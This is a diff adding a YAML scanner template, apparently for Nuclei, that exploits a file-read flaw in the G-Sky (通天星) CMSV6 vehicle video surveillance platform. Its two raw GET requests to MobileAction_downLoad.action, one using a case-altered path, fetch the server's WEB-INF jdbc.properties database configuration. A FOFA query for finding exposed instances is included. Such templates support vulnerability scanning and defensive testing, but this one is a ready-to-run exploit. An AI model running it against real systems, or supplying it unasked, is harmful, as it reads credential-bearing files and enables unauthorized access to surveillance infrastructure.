@@ -1,0 +1,49 @@
+id: gsky-cmsv6-MobileAction-downLoad-lfi
+
+info:
+  name: 通天星 CMSV6 车载视频监控平台 MobileAction_downLoad.action - 文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - 
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="./open/webApi.html"||body="/808gps/"
+  tags: g-sky,lfi
+
+http:
+  - raw:
+      - |
+        GET /808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+      - |
+        GET /808gps/MobileAction_downLoad.action?path=/WeB-INF/Classes/config/jdbc.properties HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+    
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "DATABASE"
+          - "jdbc"
+        condition: and
+
+      - type: status
+        status:
+          - 200
